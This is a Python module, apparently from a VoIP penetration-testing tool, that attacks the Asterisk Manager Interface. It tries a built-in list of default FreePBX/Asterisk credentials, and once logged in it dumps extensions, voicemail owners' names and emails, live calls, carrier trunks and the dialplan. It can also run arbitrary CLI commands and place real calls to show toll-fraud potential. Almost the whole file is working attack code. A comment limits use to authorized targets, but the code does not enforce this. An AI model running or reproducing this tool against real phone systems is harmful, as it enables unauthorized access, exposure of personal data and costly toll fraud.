"""Asterisk Manager Interface (AMI) — default-credential attack + ext dump.

When AMI (TCP 5038, sometimes 5039) is reachable and accepts weak/default
credentials, we can skip sweep entirely and ask the PBX for its literal
list of SIP peers / PJSIP endpoints. This is the single most effective
enumeration path in the wild — FreePBX historically shipped with AMI
exposed on all interfaces and `admin:amp111` as the default manager.

We parse two response shapes:
  - chan_sip: Event: PeerEntry ... Event: PeerlistComplete
  - chan_pjsip: Event: EndpointList ... Event: EndpointListComplete
"""
from __future__ import annotations

import socket
from dataclasses import dataclass, field

from .events import bus


# FreePBX/Asterisk defaults seen in the wild + CVE writeups.
# (username, password) pairs — tried in order, stops at first success.
DEFAULT_AMI_CREDS: list[tuple[str, str]] = [
    ("admin", "amp111"),         # Classic FreePBX default
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", ""),
    ("admin", "1234"),
    ("manager", "manager"),
    ("manager", "secret"),
    ("asterisk", "asterisk"),
    ("cdruser", "cdruser"),      # FreePBX CDR user
    ("astadmin", "astadmin"),
    ("root", "root"),
]


@dataclass
class AmiResult:
    success: bool
    host: str
    port: int
    username: str = ""
    password: str = ""
    banner: str = ""
    extensions: list[str] = field(default_factory=list)
    voicemail_boxes: list[dict] = field(default_factory=list)
    active_channels: list[dict] = field(default_factory=list)
    sip_registrations: list[dict] = field(default_factory=list)
    evidence: str = ""


def _send(sock: socket.socket, fields: dict[str, str]) -> None:
    msg = "".join(f"{k}: {v}\r\n" for k, v in fields.items()) + "\r\n"
    sock.sendall(msg.encode("utf-8"))


def _recv_until(sock: socket.socket, terminator: bytes,
                timeout: float, max_bytes: int = 1 << 20) -> bytes:
    """Read until we see `terminator`, a blank-line boundary, max_bytes,
    OR the total `timeout` elapses. Audit fix: prior version only enforced
    a per-recv timeout, so a slow/malicious peer could keep the call open
    forever by sending 1 byte per second. Now has a hard deadline."""
    import time as _t
    deadline = _t.monotonic() + timeout
    buf = b""
    while terminator not in buf and len(buf) < max_bytes:
        remaining = deadline - _t.monotonic()
        if remaining <= 0:
            break
        try:
            sock.settimeout(min(0.5, remaining))
            chunk = sock.recv(8192)
        except socket.timeout:
            if _t.monotonic() >= deadline:
                break
            continue
        if not chunk:
            break
        buf += chunk
    return buf


def _parse_blocks(raw: str) -> list[dict[str, str]]:
    blocks: list[dict[str, str]] = []
    for block in raw.split("\r\n\r\n"):
        fields: dict[str, str] = {}
        for line in block.splitlines():
            if ": " in line:
                k, _, v = line.partition(": ")
                fields[k.strip()] = v.strip()
        if fields:
            blocks.append(fields)
    return blocks


def try_login(
    host: str,
    port: int,
    username: str,
    password: str,
    timeout: float = 3.0,
    traffic_log=None,
) -> tuple[socket.socket | None, str]:
    """Open a TCP connection, read banner, send Login, return authenticated
    socket on success or (None, reason) on failure."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((host, port))
    except OSError as e:
        s.close()
        return None, f"tcp connect failed: {e}"

    banner = _recv_until(s, b"\r\n", timeout).decode("utf-8", errors="replace").strip()
    if traffic_log:
        traffic_log.log("IN", f"ami://{host}:{port}", banner.encode())
    if not banner.startswith("Asterisk"):
        s.close()
        return None, f"not an AMI banner: {banner[:80]!r}"

    login = {"Action": "Login", "Username": username,
             "Secret": password, "Events": "off"}
    if traffic_log:
        traffic_log.log("OUT", f"ami://{host}:{port}", str(login).encode())
    _send(s, login)
    response_raw = _recv_until(s, b"\r\n\r\n", timeout).decode("utf-8", errors="replace")
    if traffic_log:
        traffic_log.log("IN", f"ami://{host}:{port}", response_raw.encode())
    if "Response: Success" in response_raw:
        return s, banner
    s.close()
    first_line = response_raw.splitlines()[0] if response_raw else "(empty)"
    return None, f"login failed: {first_line}"


def _dump_sippeers(sock: socket.socket, timeout: float = 5.0) -> list[str]:
    _send(sock, {"Action": "SIPpeers"})
    raw = _recv_until(sock, b"PeerlistComplete", timeout).decode(
        "utf-8", errors="replace")
    # consume trailing \r\n\r\n
    raw += _recv_until(sock, b"\r\n\r\n", 0.5).decode("utf-8", errors="replace")
    out: list[str] = []
    for block in _parse_blocks(raw):
        if block.get("Event") == "PeerEntry":
            name = block.get("ObjectName") or block.get("Username")
            if name:
                out.append(name)
    return out


def _dump_pjsip(sock: socket.socket, timeout: float = 5.0) -> list[str]:
    _send(sock, {"Action": "PJSIPShowEndpoints"})
    raw = _recv_until(sock, b"EndpointListComplete", timeout).decode(
        "utf-8", errors="replace")
    raw += _recv_until(sock, b"\r\n\r\n", 0.5).decode("utf-8", errors="replace")
    out: list[str] = []
    for block in _parse_blocks(raw):
        if block.get("Event") == "EndpointList":
            name = block.get("ObjectName")
            if name:
                out.append(name)
    return out


def _dump_voicemail(sock: socket.socket, timeout: float = 5.0) -> list[dict]:
    """List voicemail boxes — reveals extension → mailbox mapping + greeting
    counts. Does NOT retrieve audio (that would require filesystem access)."""
    _send(sock, {"Action": "VoicemailUsersList"})
    raw = _recv_until(sock, b"VoicemailUserEntryComplete", timeout).decode(
        "utf-8", errors="replace")
    raw += _recv_until(sock, b"\r\n\r\n", 0.5).decode("utf-8", errors="replace")
    out: list[dict] = []
    for block in _parse_blocks(raw):
        if block.get("Event") == "VoicemailUserEntry":
            out.append({
                "mailbox": block.get("VoiceMailbox") or block.get("VMBox"),
                "context": block.get("VMContext"),
                "fullname": block.get("Fullname"),
                "email": block.get("Email"),
                "newmessages": block.get("NewMessageCount"),
                "oldmessages": block.get("OldMessageCount"),
            })
    return out


def _dump_channels(sock: socket.socket, timeout: float = 5.0) -> list[dict]:
    """Active call channels right now — shows LIVE in-progress calls the
    PBX is carrying. Great evidence for client briefings: 'here's your
    current call volume; at any of these moments an anonymous attacker
    could have injected an extra call'."""
    _send(sock, {"Action": "CoreShowChannels"})
    raw = _recv_until(sock, b"CoreShowChannelsComplete", timeout).decode(
        "utf-8", errors="replace")
    raw += _recv_until(sock, b"\r\n\r\n", 0.5).decode("utf-8", errors="replace")
    out: list[dict] = []
    for block in _parse_blocks(raw):
        if block.get("Event") == "CoreShowChannel":
            out.append({
                "channel": block.get("Channel"),
                "caller_id_num": block.get("CallerIDnum"),
                "connected_line_num": block.get("ConnectedLineNum"),
                "duration": block.get("Duration"),
                "state": block.get("ChannelStateDesc"),
                "context": block.get("Context"),
                "extension": block.get("Exten"),
            })
    return out


def _dump_registry(sock: socket.socket, timeout: float = 5.0) -> list[dict]:
    """SIP registry — outbound SIP trunks the PBX is registered to. Reveals
    the upstream carriers, which matters because toll-fraud calls placed
    through these trunks hit real money."""
    _send(sock, {"Action": "SIPshowregistry"})
    raw = _recv_until(sock, b"RegistrationsComplete", timeout).decode(
        "utf-8", errors="replace")
    raw += _recv_until(sock, b"\r\n\r\n", 0.5).decode("utf-8", errors="replace")
    out: list[dict] = []
    for block in _parse_blocks(raw):
        if block.get("Event") == "RegistryEntry":
            out.append({
                "host": block.get("Host"),
                "port": block.get("Port"),
                "username": block.get("Username"),
                "refresh": block.get("Refresh"),
                "state": block.get("State"),
            })
    return out


def _exec_command(sock: socket.socket, command: str,
                   timeout: float = 5.0) -> str:
    """Execute an Asterisk CLI command via AMI Action: Command.

    Returns the command output as a string. Useful for dumping dialplan,
    active calls, and other runtime state not exposed via AMI events.
    """
    _send(sock, {"Action": "Command", "Command": command})
    raw = _recv_until(sock, b"--END COMMAND--", timeout)
    text = raw.decode("utf-8", errors="replace")
    # Strip the AMI response wrapper
    output_lines = []
    in_output = False
    for line in text.splitlines():
        if line.startswith("Output: "):
            output_lines.append(line[8:])
            in_output = True
        elif in_output and ": " not in line and line.strip():
            output_lines.append(line)
    return "\n".join(output_lines) if output_lines else text[:2000]


def _dump_dialplan(sock: socket.socket, timeout: float = 5.0) -> str:
    """Dump Asterisk dialplan via 'dialplan show' CLI command.

    Reveals toll-free prefixes, outbound routes, pin codes in the dialplan,
    and other routing information critical for understanding attack surface.
    """
    try:
        return _exec_command(sock, "dialplan show", timeout)
    except OSError:
        return ""


def _originate_test_call(
    sock: socket.socket,
    extension: str,
    channel: str,
    caller_id: str = "pentest-demo",
    timeout_s: int = 30,
) -> bool:
    """Use AMI Originate to place a test call — demonstrates toll-fraud potential.

    WARNING: This actually places a real call through the PBX.
    Only use on authorized targets.

    channel: e.g. "SIP/1000" or "SIP/trunk/+15551234567"
    extension: target extension (or PSTN number if trunk available)
    """
    import threading
    action_id = f"voipscan-{threading.get_ident()}"
    _send(sock, {
        "Action": "Originate",
        "ActionID": action_id,
        "Channel": channel,
        "Exten": extension,
        "Context": "from-internal",
        "Priority": "1",
        "CallerID": caller_id,
        "Timeout": str(timeout_s * 1000),
        "Async": "true",
    })
    raw = _recv_until(sock, b"\r\n\r\n", 3.0)
    resp = raw.decode("utf-8", errors="replace")
    return "Response: Success" in resp or "Response: Queued" in resp


def attack(
    host: str,
    port: int = 5038,
    cred_pairs: list[tuple[str, str]] | None = None,
    timeout: float = 3.0,
    traffic_log=None,
    post_exploit: bool = True,
) -> AmiResult:
    """Try each credential pair. On success: dump extensions (chan_sip +
    chan_pjsip), plus optional post-exploit recon (voicemail, active
    channels, SIP registry). Logs off cleanly."""
    creds = cred_pairs or DEFAULT_AMI_CREDS
    bus.emit("ami.start", {"host": host, "port": port, "creds_to_try": len(creds)})
    for u, p in creds:
        bus.emit("ami.attempt", {"host": host, "username": u, "password": p})
        sock, info = try_login(host, port, u, p, timeout, traffic_log)
        if not sock:
            continue
        bus.emit("ami.success", {"host": host, "username": u, "password": p})
        try:
            ext_set: set[str] = set()
            voicemail: list[dict] = []
            channels: list[dict] = []
            registry: list[dict] = []
            dialplan_dump: str = ""
            try:
                ext_set.update(_dump_sippeers(sock, timeout))
            except OSError:
                pass
            try:
                ext_set.update(_dump_pjsip(sock, timeout))
            except OSError:
                pass
            if post_exploit:
                try:
                    voicemail = _dump_voicemail(sock, timeout)
                except OSError:
                    pass
                try:
                    channels = _dump_channels(sock, timeout)
                except OSError:
                    pass
                try:
                    registry = _dump_registry(sock, timeout)
                except OSError:
                    pass
                try:
                    dialplan_dump = _dump_dialplan(sock, timeout)
                except OSError:
                    pass
            try:
                _send(sock, {"Action": "Logoff"})
            except OSError:
                pass
        finally:
            sock.close()
        extensions = sorted(ext_set, key=lambda x: (len(x), x))
        # Emit dialplan for bus consumers if it was captured
        if dialplan_dump:
            bus.emit("ami.dialplan", {"host": host, "dialplan": dialplan_dump[:4096]})
        return AmiResult(
            success=True, host=host, port=port,
            username=u, password=p, banner=info,
            extensions=extensions,
            voicemail_boxes=voicemail,
            active_channels=channels,
            sip_registrations=registry,
            evidence=(f"Logged in as {u!r}:{p!r}; dumped {len(extensions)} "
                      f"peers/endpoints, {len(voicemail)} voicemail boxes, "
                      f"{len(channels)} active channels, "
                      f"{len(registry)} SIP registrations"
                      + (f", dialplan ({len(dialplan_dump)} chars)" if dialplan_dump else "")),
        )
    return AmiResult(
        success=False, host=host, port=port,
        evidence="no default AMI credential was accepted",
    )
